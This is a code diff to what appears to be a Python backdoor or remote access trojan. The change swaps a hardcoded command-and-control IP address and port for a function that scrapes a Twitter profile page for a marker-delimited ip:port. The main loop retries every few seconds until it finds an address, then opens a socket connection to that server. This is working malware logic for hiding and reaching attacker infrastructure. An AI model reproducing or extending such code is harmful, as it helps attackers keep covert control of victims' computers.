@@ -17,11 +17,27 @@ import sched
 import datetime
 import zlib
 import base64
+import urllib
 import shutil
 
-HOST = '109.172.189.74'
-#HOST = '127.0.0.1'
-PORT = 4434
+
+def get_ip():
+    url_list = ['https://mobile.twitter.com/ModeratorCanada',]
+    for url in url_list:
+        try:
+            req = urllib.urlopen(url).read()
+            start = req.index('#!#!#!') + 6
+            end = req.index('#?#?#?')
+            ip_port = req[start:end]
+            ip, port = ip_port.split(':')
+            return ip, int(port)
+        except:
+            pass
+    return False
+
+# HOST = '109.172.189.74'
+# #HOST = '127.0.0.1'
+# PORT = 4434
 ACTIVE = False
 
 CSIDL_COMMON_APPDATA = 35
@@ -61,6 +77,15 @@ file_name = sys.argv[0]
 
 while 1:
     try:
+        while 1:
+            ip_found = get_ip()
+            if ip_found:
+                HOST, PORT = ip_found
+                break
+            else:
+                # TODO: TEMP
+                time.sleep(5)
+
         GLOBAL_SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         GLOBAL_SOCKET.connect((HOST, PORT))
         GLOBAL_SOCKET.recv(1024)
